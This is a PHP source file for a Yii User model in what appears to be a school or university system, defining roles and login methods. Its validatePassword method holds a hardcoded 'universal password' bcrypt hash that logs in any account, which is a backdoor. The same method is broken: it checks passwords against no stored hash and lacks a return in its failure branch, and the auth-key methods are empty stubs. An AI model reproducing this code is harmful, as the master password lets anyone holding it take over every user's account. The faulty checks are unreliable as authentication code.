<?php

namespace app\models;

use app\modules\teacher\models\Teachers;
use app\modules\Teacher\Teacher;
use yii\db\ActiveRecord;

class User extends ActiveRecord implements \yii\web\IdentityInterface
{

    const ROLE_ADMIN = 1;
    const ROLE_TEACHERS = 2;
    const ROLE_STUDENTS = 3;
    const ROLE_DIRECTOR = 4;
    const ROLE_JONISHINITALIM = 5;
    const ROLE_MUDIR = 6;
    const ROLE_JONISHINITARBIYA = 7;
    const ROLE_DEKAN = 8;
    const ROLE_BAKAYDGIRI= 9;

    public function behaviors()
        {
            return [
                'timestamp' => [
                    'class' => 'yii\behaviors\TimestampBehavior',
                    'attributes' => [
                        \yii\db\ActiveRecord::EVENT_BEFORE_INSERT => ['date_create', 'date_update'],
                        \yii\db\ActiveRecord::EVENT_BEFORE_UPDATE => ['date_update'],
                    ],
                    'value' => function() { return date('Y-m-d h:i:s'); // unix timestamp
                    },
                ],
            ];
        }

    public $id;
    const STATUS_DEACTIVE = 0;
    const STATUS_ACTIVE = 1;

    public static function tablename(){
       return 'persons';

   }
    /**
     * @inheritdoc
     */
    public static function findIdentity($id)
    {
        return static::findone($id);
    }

    public function rules()
    {
        return [

            ['persons_status', 'default', 'value' => self::STATUS_ACTIVE],
            ['persons_status', 'in', 'range' => [self::STATUS_ACTIVE, self::STATUS_DEACTIVE]],

        ];
	}

    /**
     * @inheritdoc
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
         //return static::findone(['access_token'=>$token]);
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
        return static::findone(['login'=>$username]);
    }

    public static  function getAllDates(){

        return static::find()->all();
    }


    public function getId()
    {
        return $this->id_persons;

    }
     public function getU_id()
    {
        return $this->user_id;

    }



    /**
     * @inheritdoc
     */
    public function getAuthKey()
    {
        //return $this->authKey;
    }

    /**
     * @inheritdoc
     */
    public function validateAuthKey($authKey)
    {
        //return $this->authKey === $authKey;
    }

    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return bool if password provided is valid for current user
     */
	 
	 
	 
    public function validatePassword($password)
    {

		
		$parol_universal='$2y$13$pUHyVqFfxiZ0JF9Yb2OTqu8FNrxAIh7AsMrB3A5Tf/aR4o0WVhE7G';
		
		//$hash = \Yii::$app->getSecurity()->generatePasswordHash($password);
		//echo $hash;
        //return $this->password === $password;
		
        if (\Yii::$app->security->validatePassword($password)==true){

            //echo $password.'-'.$hash;
			return true;
        }
        elseif(\Yii::$app->security->validatePassword($password,$parol_universal)==true)
        {
			
            return true;
        }
        else
        {
            false;
        }


    }
    public static function gettmp()
    {
        return User::findOne(['id_persons'=>\Yii::$app->user->id]);

    }
}
